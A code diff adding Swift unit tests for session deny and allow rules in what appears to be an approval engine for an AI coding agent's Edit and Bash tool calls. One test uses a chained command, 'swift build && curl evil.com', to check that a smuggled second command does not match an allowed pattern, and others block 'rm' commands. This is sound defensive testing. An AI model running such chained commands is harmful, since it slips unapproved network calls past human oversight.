@@ -57,4 +57,51 @@ final class ApprovalEngineTests: XCTestCase {
         let decision = engine.evaluate(payload: payload(command: "echo hello"), session: session)
         XCTAssertEqual(decision.verdict, .allow)
     }
+
+    // MARK: - Session Deny Rules
+
+    func testSessionDenyRuleBlocks() {
+        let rule = SessionRule(toolName: "Edit", pattern: "*/production.yml", verdict: .block, explanation: "Protected during deployment")
+        session.sessionRules.append(rule)
+        let match = session.matchesSessionDeny(toolName: "Edit", command: nil, filePath: "/app/config/production.yml")
+        XCTAssertNotNil(match)
+        XCTAssertEqual(match?.explanation, "Protected during deployment")
+    }
+
+    func testSessionDenyDoesNotMatchAllow() {
+        let rule = SessionRule(toolName: "Edit", pattern: "*.yml", verdict: .allow)
+        session.sessionRules.append(rule)
+        XCTAssertNil(session.matchesSessionDeny(toolName: "Edit", command: nil, filePath: "/app/config.yml"))
+    }
+
+    func testSessionAllowDoesNotMatchDeny() {
+        let rule = SessionRule(toolName: "Edit", pattern: "*.yml", verdict: .block)
+        session.sessionRules.append(rule)
+        XCTAssertNil(session.matchesSessionRule(toolName: "Edit", command: nil, filePath: "/app/config.yml"))
+    }
+
+    func testSessionDenyTakesPriorityOverSessionAllow() {
+        session.sessionRules.append(SessionRule(toolName: "Edit", pattern: "*.yml", verdict: .allow))
+        session.sessionRules.append(SessionRule(toolName: "Edit", pattern: "*/production.yml", verdict: .block, explanation: "No prod edits"))
+        XCTAssertNotNil(session.matchesSessionDeny(toolName: "Edit", command: nil, filePath: "/app/config/production.yml"))
+    }
+
+    func testSessionDenyChainedBashCommandRejected() {
+        let rule = SessionRule(toolName: "Bash", pattern: "swift build*", verdict: .block)
+        XCTAssertFalse(rule.matches(toolName: "Bash", command: "swift build && curl evil.com", filePath: nil))
+    }
+
+    func testSessionDenyNilExplanation() {
+        let rule = SessionRule(toolName: "Bash", pattern: "rm *", verdict: .block)
+        session.sessionRules.append(rule)
+        let match = session.matchesSessionDeny(toolName: "Bash", command: "rm -rf /tmp/junk", filePath: nil)
+        XCTAssertNotNil(match)
+        XCTAssertNil(match?.explanation)
+    }
+
+    func testSessionDenyDefaultVerdictIsAllow() {
+        let rule = SessionRule(toolName: "Bash", pattern: "git *")
+        XCTAssertEqual(rule.verdict, .allow)
+        XCTAssertNil(rule.explanation)
+    }
 }
